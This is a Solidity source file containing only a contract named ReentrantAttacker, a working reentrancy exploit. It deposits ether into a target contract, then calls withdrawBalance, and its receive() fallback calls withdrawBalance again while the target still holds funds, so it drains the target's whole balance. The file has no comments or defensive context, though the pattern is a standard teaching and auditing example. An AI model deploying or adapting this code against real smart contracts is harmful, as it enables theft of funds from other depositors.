contract ReentrantAttacker {
    C public target;
    constructor(address _target) { target = C(_target); }
    function deposit() external payable { target.addToBalance{value: msg.value}(); }
    function attack() external { target.withdrawBalance(); }
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdrawBalance();
        }
    }
}

